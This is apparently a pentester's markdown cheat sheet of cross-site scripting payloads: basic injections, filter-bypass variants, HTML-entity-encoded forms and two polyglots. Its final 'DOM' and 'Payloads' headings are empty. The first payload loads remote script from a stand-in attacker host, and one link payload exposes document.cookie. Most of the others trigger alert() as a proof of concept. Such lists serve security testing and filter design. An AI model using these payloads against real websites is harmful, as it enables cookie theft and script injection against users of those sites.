Cross Site Scripting {XSS}
==========================

# Reflected && Persistent/Stored

## Basic Payloads

`<script SRC=http://attacker.domain.com/payload.js></script>`

`<img SRC="javascript:alert('XSS');">`

`<iframe src="javascript:alert(`xss`)">`

`<body oninput=javascript:alert(1)><input autofocus>`

## Filter Bypass Payloads

### No Quotes && Semicolon

`<IMG SRC=javascript:alert('XSS')>`

### Case Filtering

`<IMG SRC=JaVaScRiPt:alert('XSS')>`

### HTML Entities

`<IMG SRC=javascript:alert(&quot;XSS&quot;)>`

### Grave Accent Obfuscation

+ Hide double and single quotes from filter with grave accent wrapping
```
<IMG SRC=`javascript:alert("Hello, 'XSS'")`>
```

### Malformed Link Tags `<a>`

```
\<a onmouseover="alert(document.cookie)"\>attacker.domain.com/payload.js\</a\>
```

#### Chrome Edgecase

```
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

### Malformed `<img>` tags

`<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`


## Encoded Payloads


### JS alert encode

```
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

```

### HTML Decimal Character Refrences

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

```

```
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

```

### HTML Hexidecimal Character Refrences

```
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```


## Polyglots

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

```
jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
```

# DOM


# Payloads